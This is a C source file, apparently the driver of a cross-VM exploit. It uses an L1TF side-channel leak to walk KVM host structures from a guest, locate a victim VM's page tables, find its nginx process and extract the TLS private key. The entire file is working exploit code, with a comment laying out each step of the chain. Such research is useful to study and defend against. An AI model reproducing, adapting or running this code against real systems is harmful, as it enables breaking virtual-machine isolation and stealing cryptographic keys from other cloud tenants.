#include <assert.h>
#include <ctype.h>
#include <err.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>
#include "constants.h"
#include "helpers.h"
#include "hypercall.h"
#include "l1tf.h"
#include "spectre.h"
#include "util.h"
#include "timing.h"
#include "reverse.h"
#include "benchmark.h"
#include "config.h"
#include "leak.h"

#define direct_map 0xffff934040000000

uintptr_t pa(uintptr_t va) {
	uintptr_t p = va - direct_map;
	assert(p < (1ULL << 40));
	return p;
}

int in_direct_map(uintptr_t va)
{
	return (va >> 40) == (direct_map >> 40);
}

uintptr_t leak_task_struct(uintptr_t base, uintptr_t task_struct)
{
	const int verbose = 1;
	// char prios[0xc];
	// l1tf_leak(prios, base, pa(task_struct+OFF_PRIOS), sizeof(prios), repeats);
	// printf("prios:\n"); display(prios, sizeof(prios));

	char comm[0x10];
	l1tf_leak(comm, base, pa(task_struct+H_TASK_COMM), sizeof(comm));
	printf("comm:\n"); display(comm, sizeof(comm));

	printf("task_struct %16lx | comm ", task_struct);
	for (unsigned long i = 0; i < sizeof(comm); i++)
		printf("%c", isprint(comm[i]) ? comm[i] : '.');
	printf("\n");

	uintptr_t tasks_next = 0, tasks_prev = 0;
	do {
		l1tf_leak((char *)&tasks_next, base, pa(task_struct+H_TASK_TASKS), sizeof(tasks_next));
		if (in_direct_map(tasks_next))
			l1tf_leak((char *)&tasks_prev, base, pa(tasks_next+8), sizeof(tasks_prev));
		else
			tasks_prev = -1;
		if (verbose) printf("tasks_next %16lx,  tasks_prev %16lx (expected: %16lx)\n", tasks_next, tasks_prev, task_struct+H_TASK_TASKS);
	} while (tasks_prev != task_struct+H_TASK_TASKS);

	uintptr_t next_task_struct = tasks_next - H_TASK_TASKS;
	return next_task_struct;
}

uintptr_t leak_task_struct_backward(uintptr_t base, uintptr_t task_struct)
{
	const int verbose = 1;

	char comm[0x10];
	l1tf_leak(comm, base, pa(task_struct+H_TASK_COMM), sizeof(comm));
	printf("comm:\n"); display(comm, sizeof(comm));

	printf("task_struct %16lx | comm ", task_struct);
	for (unsigned long i = 0; i < sizeof(comm); i++)
		printf("%c", isprint(comm[i]) ? comm[i] : '.');
	printf("\n");

	uintptr_t tasks_prev = 0, tasks_next = 0;
	do {
		l1tf_leak((char *)&tasks_prev, base, pa(task_struct+H_TASK_TASKS+8), sizeof(tasks_prev));
		if (in_direct_map(tasks_prev))
			l1tf_leak((char *)&tasks_next, base, pa(tasks_prev), sizeof(tasks_next));
		else
			tasks_next = -1;
		if (verbose) printf("tasks_prev %16lx,  tasks_next %16lx (expected: %16lx)\n", tasks_prev, tasks_next, task_struct+H_TASK_TASKS);
	} while (tasks_next != task_struct+H_TASK_TASKS);

	uintptr_t prev_task_struct = tasks_prev - H_TASK_TASKS;
	return prev_task_struct;
}

void leak_process_list(hpa_t base, hva_t own_task_struct)
{
	// leak_task_struct(base, own_task_struct, 9);
	// uintptr_t task_prev = 0xffff93416c014a80-H_TASK_TASKS;
	// leak_task_struct(base, task_prev, 9);
	// uintptr_t task_prev_next = 0xffff934214810a40-H_TASK_TASKS;
	// leak_task_struct(base, task_prev_next, 9);
	// uintptr_t task_prev_prev = 0xffff93a1c66b2a80-H_TASK_TASKS;
	// leak_task_struct(base, task_prev_prev, 9);

	uintptr_t first_task_struct = 0xffff93416c014a80-H_TASK_TASKS;
	uintptr_t task_struct = first_task_struct;
	do {
		// task_struct = leak_task_struct(base, task_struct);
		task_struct = leak_task_struct_backward(base, task_struct);
	} while (task_struct != first_task_struct);
}

void config_print(void)
{
	printf("========[CONFIG]========\n");
	printf("MACHINE: %11s (%d)\n", MACHINE_STR, MACHINE);
	printf("HELPERS: %11s (%d)\n", HELPERS ? "YES" : "NO", HELPERS);
	printf("LEAK:    %11s (%d)\n", LEAK_STR, LEAK);
	printf("========================\n\n");
}

hva_t host_direct_map(hpa_t base)
{
#if defined(HOST_DIRECT_MAP)
	dump(HOST_DIRECT_MAP);
	return HOST_DIRECT_MAP;
#endif
	assert(0 && "TODO: break host KASLR, i.e., brute force lapic's pa");
}

hva_t own_vcpu(hpa_t base, hva_t hdm)
{
	hva_t lapic = leak64(base, base);
	dump(lapic);
	hva_t vcpu = leak64(base, lapic-hdm+H_LAPIC_VCPU);
	dump(vcpu);
	return vcpu;
}

hpa_t host_cr3(hpa_t base, hva_t hdm, hva_t vcpu)
{
	hva_t pid = leak64(base, vcpu-hdm+H_VCPU_PID);
	dump(pid);
	hva_t task = leak64(base, pid-hdm+H_PID_TASKS) - H_TASK_PID_LINKS;
	dump(task);
	hva_t mm = leak64(base, task-hdm+H_TASK_MM);
	dump(mm);
	hva_t pgd = leak64(base, mm-hdm+H_MM_PGD);
	dump(pgd);
	hpa_t hcr3 = pgd - hdm;
	dump(hcr3);
	return hcr3;
}

hva_t victim_vcpu(hpa_t base, hva_t hdm, hpa_t hcr3, hva_t vcpu_self)
{
	hva_t kvm = leak64(base, vcpu_self-hdm+H_VCPU_KVM);
	dump(kvm);

	hpa_t kvm_p2 = translate_va(base, kvm+0x1000, hcr3);
	hva_t kvm_vic = leak64(base, kvm_p2-0x1000+H_KVM_VM_LIST+8) - H_KVM_VM_LIST;
	dump(kvm_vic);

	hpa_t kvm_vic_p2 = translate_va(base, kvm_vic+0x1000, hcr3);

	hva_t vcpu_vic = -1, kvm_leak = -1;
	do {
		hva_t head = leak64(base, kvm_vic_p2-0x1000+H_KVM_VCPU_ARRAY+H_XARRAY_HEAD);
		u64 entry = leak64(base, head-hdm+0x18);
		dump(entry);
		hva_t ptr = (entry << 16) | (entry >> 48); // Crazy xarray stuff.
		vcpu_vic = leak64(base, ptr-hdm+0x10);
		dump(vcpu_vic);
		kvm_leak = leak64(base, vcpu_vic-hdm);
		dump(kvm_leak);
	} while (kvm_leak != kvm_vic);

	return vcpu_vic;
}

hpa_t guest_eptp(hpa_t base, hva_t hdm, hva_t vcpu)
{
	assert(leak64(base, vcpu-hdm+H_VCPU_ARCH+H_ARCH_MMU) == vcpu+H_VCPU_ARCH+H_ARCH_ROOT_MMU);
	hva_t eptp = leak64(base, vcpu-hdm+H_VCPU_ARCH+H_ARCH_ROOT_MMU+H_MMU_ROOT+H_INFO_HPA);
	dump(eptp);
	return eptp;
}

hpa_t guest_cr3(hpa_t base, hva_t hdm, hva_t vcpu, hpa_t eptp)
{
	gpa_t ggcr3 = leak64(base, vcpu-hdm+H_VCPU_ARCH+H_ARCH_CR3) & PFN_MASK;
	dump(ggcr3);
	hpa_t gcr3 = translate_va(base, ggcr3, eptp);
	dump(gcr3);
	return gcr3;
}

gva_t guest_text(hpa_t base, hva_t hdm, hva_t vcpu, hpa_t eptp, hpa_t gcr3)
{
	gpa_t gpgd = leak64(base, gcr3 + 0x1ff*sizeof(pte_t)) & PFN_MASK;
	hpa_t l1 = translate_va(base, gpgd, eptp);
	gpa_t gpud = leak64(base, l1 + 0x1fe*sizeof(pte_t)) & PFN_MASK;
	hpa_t l2 = translate_va(base, gpud, eptp);
	uint8_t gpmd_low;
	long i;
	for (i = 0; i < 0x200; i += 0x10) {
		leak(&gpmd_low, base, l2+i*sizeof(pte_t), 1);
		if (gpmd_low & 1)
			break;
	}
	while ((gpmd_low & 1) && i >= 0) {
		i--;
		leak(&gpmd_low, base, l2+i*sizeof(pte_t), 1);
	}
	i++;
	gva_t gtext = (0xffffULL << 48) | (0x1ffULL << 39) | (0x1feULL << 30) | (i << 21);
	dump(gtext);
	return gtext;
}

void guest_task_next(hpa_t base, hpa_t eptp, hpa_t gcr3, gva_t *gtask, hpa_t *task)
{
	const int verbose = 0;
	gva_t gnext, gprev;
	hpa_t next;
	int count = 0;
	if (verbose >= 2) dump(*gtask);
	if (verbose >= 2) dump(*task);
	do {
		gnext = leak64(base, (*task)+G_TASK_TASKS);
		if (verbose >= 2) dump(gnext);
		// TODO optimize: (almost) all these tasks are in the guest's direct map; don't doubly translate.
		next = translate_nested(base, gnext, gcr3, eptp);
		if (verbose >= 2) dump(next);
		gprev = leak64(base, next+8);
		if (verbose >= 2) dump(gprev);
		if (++count % 1000 == 0) {
			printf("WARNING: guest_task_next count %d\n", count);
			dump(*gtask); dump(*task); dump(gnext); dump(next); dump(gprev);
			char comm[G_TASK_COMM_LEN+1] = {0};
			leak(comm, base, next-G_TASK_TASKS+G_TASK_COMM, G_TASK_COMM_LEN);
			display(comm, G_TASK_COMM_LEN);
			if (count == 10000)
				exit(1);
		}
	} while (gprev != *gtask+G_TASK_TASKS);

	*gtask = gnext - G_TASK_TASKS;
	if (verbose >= 2) dump(*gtask);
	*task = next - G_TASK_TASKS;
	if (verbose >= 2) dump(*gtask);
}

#define guest_for_each_task(gtask, task, base, eptp, gcr3, first_task_gva) \
	for (gtask = first_task_gva, \
		task = translate_nested(base, gtask, gcr3, eptp), \
		guest_task_next(base, eptp, gcr3, &gtask, &task); \
		gtask != first_task_gva; \
		guest_task_next(base, eptp, gcr3, &gtask, &task))

void guest_task_prev(hpa_t base, hpa_t eptp, hpa_t gcr3, gva_t *gtask, hpa_t *task)
{
	const int verbose = 0;
	gva_t gprev, gnext;
	hpa_t prev;
	int count = 0;
	if (verbose >= 2) dump(*gtask);
	if (verbose >= 2) dump(*task);
	do {
		gprev = leak64(base, (*task)+G_TASK_TASKS+8);
		if (verbose >= 2) dump(gprev);
		// TODO optimize: (almost) all these tasks are in the guest's direct map; don't doubly translate.
		prev = translate_nested(base, gprev, gcr3, eptp);
		if (verbose >= 2) dump(prev);
		gnext = leak64(base, prev);
		if (verbose >= 2) dump(gnext);
		if (++count % 1000 == 0) {
			printf("WARNING: guest_task_next count %d\n", count);
			dump(*gtask); dump(*task); dump(gprev); dump(prev); dump(gnext);
			char comm[G_TASK_COMM_LEN+1] = {0};
			leak(comm, base, prev-G_TASK_TASKS+G_TASK_COMM, G_TASK_COMM_LEN);
			display(comm, G_TASK_COMM_LEN);
			if (count == 10000)
				exit(1);
		}
	} while (gnext != *gtask+G_TASK_TASKS);

	*gtask = gprev - G_TASK_TASKS;
	if (verbose >= 2) dump(*gtask);
	*task = prev - G_TASK_TASKS;
	if (verbose >= 2) dump(*gtask);
}

#define guest_for_each_task_reverse(gtask, task, base, eptp, gcr3, first_task_gva) \
	for (gtask = first_task_gva, \
		task = translate_nested(base, gtask, gcr3, eptp), \
		guest_task_prev(base, eptp, gcr3, &gtask, &task); \
		gtask != first_task_gva; \
		guest_task_prev(base, eptp, gcr3, &gtask, &task))

hpa_t guest_find_task(hpa_t base, hpa_t eptp, hpa_t gcr3, gva_t gtext, const char *name)
{
	gva_t ginit = gtext + G_TEXT_INIT_TASK;
	dump(ginit);
	hpa_t init_comm = translate_nested(base, ginit+G_TASK_COMM, gcr3, eptp);
	dump(init_comm);
	char comm[G_TASK_COMM_LEN+1] = {0};
	leak(comm, base, init_comm, G_TASK_COMM_LEN);
	printf("%30s = %s\n", "comm", comm);
	// display(comm, sizeof(comm));
	pid_t pids[2];
	gva_t gtask;
	hpa_t task;
	guest_for_each_task_reverse(gtask, task, base, eptp, gcr3, ginit) {
		leak(pids, base, task+G_TASK_PID, sizeof(pids));
		printf("pid = %5d, tgid = %5d, ", pids[0], pids[1]);
		leak(comm, base, task+G_TASK_COMM, G_TASK_COMM_LEN);
		printf("%7s = %s\n", "comm", comm);
		if (strcmp(comm, name) == 0)
			break;
	}

	// Go two tasks further, to reach the nginx master process.
	guest_task_prev(base, eptp, gcr3, &gtask, &task);
	leak(pids, base, task+G_TASK_PID, sizeof(pids));
	printf("pid = %5d, tgid = %5d, ", pids[0], pids[1]);
	leak(comm, base, task+G_TASK_COMM, G_TASK_COMM_LEN);
	printf("%7s = %s\n", "comm", comm);
	guest_task_prev(base, eptp, gcr3, &gtask, &task);
	leak(pids, base, task+G_TASK_PID, sizeof(pids));
	printf("pid = %5d, tgid = %5d, ", pids[0], pids[1]);
	leak(comm, base, task+G_TASK_COMM, G_TASK_COMM_LEN);
	printf("%7s = %s\n", "comm", comm);

	dump(gtask);
	dump(task);

	return task;
}

char *nginx_leak_key(hpa_t base, hpa_t eptp, hpa_t gcr3, hpa_t nginx)
{
	char *key = malloc(SSLKEY_LEN);

	// Find nginx's heap (in its own virtual address space).
	gva_t gmm = leak64(base, nginx+G_TASK_MM);
	dump(gmm);
	hpa_t heap_hpa = translate_nested(base, gmm+G_MM_HEAP, gcr3, eptp);
	dump(heap_hpa);
	gva_t heap = leak64(base, heap_hpa);
	dump(heap);

	// Find nginx's CR3, so we can translate nginx's heap addresses.
	hva_t nginx_pgd = translate_nested(base, gmm+G_MM_PGD, gcr3, eptp);
	dump(nginx_pgd);
	gva_t nginx_cr3 = leak64(base, nginx_pgd);
	dump(nginx_cr3);
	hpa_t ngcr3 = translate_nested(base, nginx_cr3, gcr3, eptp);
	dump(ngcr3);

	// Leak the private key.
	hpa_t sslkey = translate_nested(base, heap+NGINX_SSLKEY, ngcr3, eptp);
	dump(sslkey);
	leak(key, base, sslkey, SSLKEY_LEN);
	display(key, SSLKEY_LEN);

	return key;
}


/* Exploit Chain
 * =============
 *
 * Our goals are the following:
 * - Find host's direct map: map -> lapic; brute force lapic's pa.
 * - Leak host's CR3: lapic -> vcpu -> pid -> task -> mm.
 * - Find victim VCPU: vcpu -> kvm -{vm_list}-> kvm -> vcpu_array -> vcpu.
 * - Leak guest's EPTP: vcpu -> arch -> mmu -> info.
 * - Leak guest's CR3: vcpu -> arch -> cr3.
 * - Find guest's kernel text: read from page tables.
 * - Find nginx: text -> init -{tasks,comm}-> nginx.
 * - Leak TSL key: nginx -> mm -> pgd; mm -> heap.
 */
void exploit_chain(hpa_t base)
{
	hva_t hdm = host_direct_map(base);
	hva_t vcpu_self = own_vcpu(base, hdm);
	hpa_t hcr3 = host_cr3(base, hdm, vcpu_self);
	hva_t vcpu_vic = victim_vcpu(base, hdm, hcr3, vcpu_self);
	// vcpu_vic = vcpu_self;
	hpa_t eptp = guest_eptp(base, hdm, vcpu_vic);
	hpa_t gcr3 = guest_cr3(base, hdm, vcpu_vic, eptp);
	gva_t gtext = guest_text(base, hdm, vcpu_vic, eptp, gcr3);
	hpa_t nginx = guest_find_task(base, eptp, gcr3, gtext, "nginx");
	char *key = nginx_leak_key(base, eptp, gcr3, nginx);
	printf("key not unused: %p\n", key);

	// dump(procfs_get_data(0xffffffff9f000000));

	// hpa_t text = translate_nested(base, 0xffffffff9f000000, gcr3, eptp);
	// dump(leak64(base, text));

	// dump_page_table_mappings(base, gcr3, eptp);

	// dump(leak64(base, vcpu_vic-hdm+H_VCPU_ARCH+15*8));
}

int main(void)
{
	config_print();
	srand(time(0));
	set_cpu_affinity(CPU);
	l1tf_init();
	hpa_t base = gadget_base();

	exploit_chain(base);

	// get_feeling_for_kernel_kvm_data_structures();

	return 0;
}
